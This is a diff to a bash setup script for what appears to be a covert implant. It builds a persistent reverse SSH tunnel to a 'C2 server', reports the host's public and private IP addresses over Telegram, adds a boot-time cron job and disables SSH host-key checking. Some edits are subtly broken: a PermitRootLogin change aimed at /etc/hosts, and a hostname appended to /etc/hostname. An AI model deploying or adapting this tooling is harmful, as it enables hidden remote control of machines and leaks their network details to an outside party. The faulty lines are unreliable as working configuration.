@@ -36,6 +36,15 @@ function printBanner {
 }
 
 function initialSetup {
+    echo -e "${yellowColor}[*]Changing hostname to "herobrine"...${resetColor}"
+    if ! grep -q "herobrine" /etc/hostname; then
+        echo "herobrine" >>/etc/hostname
+    fi
+
+    if ! grep -q "herobrine" /etc/hosts; then
+        sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/hosts
+    fi
+
     echo -e "${yellowColor}[*] Updating list of repositories...${resetColor}"
     apt-get update -y
 
@@ -87,8 +96,9 @@ function autoSSH {
     echo -e "${yellowColor}[*] Generating SSH key pair...${resetColor}"
     ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y 2>&1 >/dev/null
 
-    echo -e "${yellowColor}[*] Sending via Telegram the /root/.ssh/authorized_keys file base64 encoded that has to go in C2...${resetColor}"
-    /bin/telegram.sh "$(cat /root/.ssh/id_rsa.pub | base64)"
+    echo -e "${yellowColor}[*] Copy this text string to /root/.ssh/authorized_keys on the C2 server:${resetColor}"
+    cat /root/.ssh/id_rsa.pub
+    read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
 
     echo -e "${yellowColor}[*] Creating script /bin/autossh-connect.sh...${resetColor}"
     read -p "[*] Enter URL with SSH connection data (Format: IP:PORT): " urlssh
@@ -99,9 +109,9 @@ function autoSSH {
     echo 'port="$(echo $output | cut -d: -f2)"' >>/bin/autossh-connect.sh
     echo '/bin/telegram.sh "$(echo Public IP: $(curl -s ifconfig.co))"' >>/bin/autossh-connect.sh
     echo '/bin/telegram.sh "$(echo Private IP: $(hostname -I))"' >>/bin/autossh-connect.sh
-    echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port"' >>/bin/autossh-connect.sh
+    echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port" -o "StrictHostKeyChecking no"' >>/bin/autossh-connect.sh
     chmod +x /bin/autossh-connect.sh
-
+  
     echo -e "${yellowColor}[*] Creating cronjob for autossh...${resetColor}"
     crontab -l > mycron
     echo "@reboot sleep 15 && /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
